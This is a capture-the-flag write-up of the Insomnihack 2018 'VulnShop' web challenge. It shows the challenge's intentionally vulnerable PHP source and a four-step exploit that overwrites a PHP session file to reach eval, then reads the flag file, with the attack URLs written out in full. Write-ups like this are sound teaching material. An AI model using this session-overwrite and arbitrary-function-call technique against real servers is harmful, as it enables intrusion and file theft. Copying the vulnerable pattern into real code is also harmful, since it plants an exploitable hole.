# VulnShop

VulnShop was a web challenge in the Insomnihack 2018 teaser. It was solved by [SIben](https://twitter.com/_SIben_), nodauf and [Geluchat](https://twitter.com/Geluchat) (*khack40*) for Inshall'hack. While it ended up being the most flagged challenge of the CTF (apart from the warmup, of course), it was an interesting lesson.

## Challenge description

```
We're preparing a website for selling some important vulnerabilities in the future. You can browse some static pages on it, waiting for the official release.

http://vulnshop.teaser.insomnihack.ch
```

## Source code

The link leads to a page containing two interesting links: one to the source code of the page, and the other to the phpinfo output for the server.

The source code was the following:

```php
<?php if(isset($_GET['hl'])){ highlight_file(__FILE__); exit; }
    error_reporting(0); session_start(); 
    // Anti XSS filter
    $_REQUEST = array_map("strip_tags", $_REQUEST);
    // For later, when we will store infos about visitors.
    chdir("tmp");
?>
<!DOCTYPE html>
<html>
    <head>
        <title>Work in progress...</title>
        <meta charset="utf-8" />
        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
        <style>
            body {
                background-color: #aaa;
                color:#fff;
            }
            
            .page {
                width: 50%;
                margin: 0 auto;
                margin-top: 75px;
            }
            
            
            .menu ul li {
                display:inline-block;
                vertical-align:top;
                margin-right: 30px;
                
            }
        </style>
    </head>
    <body>
        <div class="page">
            <div class="menu">
                <ul>
                    <li><a href="?page=default">Home</a></li>
                    <li><a href="?page=introduction">Introduction</a></li>
                    <li><a href="?page=privacy">Privacy</a></li>
                    <li><a href="?page=contactus">Contact</a></li>
                </ul>
            </div>
            
            <div class="content">
                <?php
                        switch($_GET['page']) {
                            case 'default':
                            default:
                                echo "<p>Welcome to our website about infosec. It's still under construction, but you can begin to browse some pages!</p>";
                                break;
                            case 'introduction':
                                echo "<p>Our website will introduce some new vulnerabilities. Let's check it out later!</p>";
                                break;
                            case 'privacy':
                                echo "<p>This website is unbreakable, so don't worry when contacting us about some new vulnerabilities!</p>";
                                break;
                            case 'contactus':
                                echo "<p>You can't contact us for the moment, but it will be available later.</p>";
                                $_SESSION['challenge'] = rand(100000,999999);
                                break;
                            case 'captcha':
                                if(isset($_SESSION['challenge'])) echo $_SESSION['challenge'];
                                // Will make an image later
                touch($_SESSION['challenge']);
                                break;
                            case 'captcha-verify':
                // verification functions take a file for later, when we'll provide more way of verification
                                function verifyFromString($file, $response) {
                                    if($_SESSION['challenge'] === $response) return true;
                                    else return false;
                                }
                                
                                // Captcha from math op
                                function verifyFromMath($file, $response) {
                                    if(eval("return ".$_SESSION['challenge']." ;") === $response) return true;
                                    else return false;
                                }
                                if(isset($_REQUEST['answer']) && isset($_REQUEST['method']) && function_exists($_REQUEST['method'])){
                                    $_REQUEST['method']("./".$_SESSION['challenge'], $_REQUEST['answer']);
                                }
                                break;

                        }
                ?>
            </div>
        </div>
        <p><a href="/?hl">View code source of the file, to be sure we're secure!</a></p>
        <p><a href="/phpinfo.php">Show our configurations</a></p>
    </body>
</html>
```

## Angles of attack

Ugh. Lots of different options page options. Two lines catch the eye immediately though:
```php
$_REQUEST['method']("./".$_SESSION['challenge'], $_REQUEST['answer']);
```

and

```php
if(eval("return ".$_SESSION['challenge']." ;") === $response) return true;
```

The **phpinfo()** information tells us that the exec-like functions are disabled. We notice that we are able to write arbitrary data to the file `./".$_SESSION['challenge']` using the first line highlighted above with `method` set to `file_put_contents` and `answer` set to whatever we want to write to the file.

The file `./".$_SESSION['challenge']` must be created first of course, which is done by first visiting the **contactus** page (`$_SESSION['challenge'] = rand(100000,999999);`) followed by the **captcha** page (`touch($_SESSION['challenge']);`).

However, the following line is executed at the beginning of the program:
```
$_REQUEST = array_map("strip_tags", $_REQUEST);
```

We're therefore unable to write PHP code to a file, as we can not write the "<" character because of the filter.

The second line highlighted above seems very attractive all of a sudden, but it requires us to control the value of `$_SESSION['challenge']`.

## Modifying session data

In order to control the string passed to **eval**, we need to overwrite the session file with our payload. Fortunately, **phpinfo()** tells us that the session files are stored at `/var/lib/php/sessions`, which means that session **xxx** is stored at **/var/lib/php/sessions/sess_xxx**.

Here are the steps we need to follow:
1. Generate a valid session file containing our payload in `$_SESSION['challenge']`;
2. Write that payload to a file using **file_put_contents** and `$_REQUEST['method']("./".$_SESSION['challenge'],$_REQUEST['answer']);`;
3. Overwrite our session file with the file from the previous step;
4. Call the `verifyFromMath` function in order to trigger the **eval** and profit!

We're going to try to list the files on the server for a start.

### Step 1

The first step is achieved quite easily: in a PHP interpreter, we type the following lines:
```php
session_start();
$_SESSION['challenge'] = "var_dump(scandir($_GET['arg']))";
```
After closing the interpreter, we retrieve the contents of the session file:
`challenge|s:31:"var_dump(scandir($_GET['arg']))";`.

### Step 2

The second step is accomplished by visiting `http://vulnshop.teaser.insomnihack.ch/?page=captcha-verify&method=file_put_contents&answer=challenge|s:31:"var_dump(scandir($_GET['arg']))";`.

### Step 3

In the third step, we check our cookie to find out what our session file's name is. Assuming its name is **xxx**, we visit the following link: `http://vulnshop.teaser.insomnihack.ch/?page=captcha-verify&method=copy&answer=/var/lib/php/sessions/sess_xxx`.

### Step 4

The fourth step is basically just about gloating about how our awesome payload works, and actually using it:
we visit `http://vulnshop.teaser.insomnihack.ch/?page=captcha-verify&method=verifyFromMath&answer=1&arg=/`.
We notice a file named **flag** at the root of the server. Wonder what it could be.

## Wrapping up

Now that we know which file to read, we go through our 4 steps again, with the payload `var_dump(file_get_contents($_GET['arg']))`, and the result is:

**string(39) "INS{4rb1tr4ry_func_c4ll_is_n0t_s0_fun} "**
